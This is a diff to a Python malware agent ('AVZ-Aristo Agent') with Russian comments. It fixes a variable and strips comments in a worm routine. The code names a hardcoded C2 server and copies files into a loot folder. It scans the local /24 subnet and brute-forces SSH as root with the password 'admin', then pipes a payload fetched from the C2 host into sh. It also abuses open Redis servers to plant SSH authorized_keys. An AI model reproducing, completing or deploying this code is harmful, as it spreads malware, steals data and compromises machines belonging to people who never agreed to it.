@@ -1,5 +1,5 @@
 #!/usr/bin/env python3
-# AVZ-Aristo Agent v25.7 – выполняет команды, самораспространение в локальной сети
+# AVZ-Aristo Agent v25.7.1 – исправлены переменные, самораспространение
 import socket, json, time, os, platform, subprocess, threading, ipaddress
 
 C2_HOST = "80.249.146.202"
@@ -74,18 +74,15 @@ def execute_grab():
                 shutil.copy(f, loot_dir)
 
 def spread_to_local_network():
-    """Заражает другие устройства в своей /24 подсети простыми методами."""
     try:
         local_ip = socket.gethostbyname(socket.gethostname())
     except:
         return
     network = str(ipaddress.IPv4Interface(f"{local_ip}/24").network)
-    print(f"[spread] сканирую {network}")
-    # Используем упрощённый спредер (импортируем функции из spreader.py, если они доступны)
-    # Здесь заглушка — запускаем простой SSH/Telnet брутфорс в потоках
+    print(f"[spread] scanning {network}")
+    agent_url = f"http://{C2_HOST}:{C2_PORT}/agent_bash.sh"
     def probe_and_infect(ip):
         import subprocess, socket
-        # пробуем SSH ключом (если есть) или дефолтные пароли
         for port in [22, 23, 80, 443, 2375, 6379]:
             try:
                 s = socket.socket()
@@ -93,7 +90,7 @@ def spread_to_local_network():
                 s.connect((ip, port))
                 s.close()
                 if port == 22:
-                    subprocess.call(f"sshpass -p 'admin' ssh -o StrictHostKeyChecking=no root@{ip} 'wget -O- {AGENT_URL} | sh'", shell=True, timeout=3)
+                    subprocess.call(f"sshpass -p 'admin' ssh -o StrictHostKeyChecking=no root@{ip} 'wget -O- {agent_url} | sh'", shell=True, timeout=3)
                 elif port == 6379:
                     import redis
                     r = redis.Redis(host=ip, port=6379, socket_timeout=1)
@@ -102,7 +99,6 @@ def spread_to_local_network():
                     r.config_set('dir', '/root/.ssh')
                     r.config_set('dbfilename', 'authorized_keys')
                     r.save()
-                # другие порты можно добавить
             except:
                 pass
     threads = []
@@ -115,7 +111,6 @@ def spread_to_local_network():
         t.join()
 
 def main_loop():
-    # Запускаем самораспространение в фоне
     threading.Thread(target=spread_to_local_network, daemon=True).start()
     while True:
         try:
